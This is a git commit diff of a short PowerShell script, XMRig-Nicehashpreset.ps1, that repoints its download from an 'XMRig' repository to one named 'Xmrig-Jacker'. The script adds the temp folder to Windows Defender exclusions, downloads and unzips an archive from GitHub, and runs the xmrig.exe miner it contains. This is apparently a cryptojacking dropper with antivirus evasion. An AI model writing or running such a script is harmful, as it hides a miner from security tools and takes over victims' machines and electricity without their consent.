d03d2bcaa6d22ad267440cfe3687c196fa63d61e
Peekaboo-ICU <134564332+Peekaboo-ICU@users.noreply.github.com>
2023-06-29 10:22:47 +1000

    Update XMRig-Nicehashpreset.ps1

--- XMRig-Nicehashpreset.ps1
+++ XMRig-Nicehashpreset.ps1
@@ -1,5 +1,5 @@
 Add-MpPreference -ExclusionPath "$env:temp"
 $D = "$env:temp"
-Invoke-WebRequest -Uri 'https://github.com/Peekaboo-ICU/XMRig/archive/refs/heads/main.zip' -OutFile "$D\Xmrig-main.zip"
-Expand-Archive -Path "$D\Xmrig-main.zip" -DestinationPath $D -Force
-& "$D\xmrig-main\xmrig.exe"
+Invoke-WebRequest -Uri 'https://github.com/Peekaboo-ICU/Xmrig-Jacker/archive/refs/heads/main.zip' -OutFile "$D\Xmrig-Jacker-main.zip"
+Expand-Archive -Path "$D\Xmrig-Jacker-main.zip" -DestinationPath $D -Force
+& "$D\Xmrig-Jacker-main\xmrig\xmrig.exe"
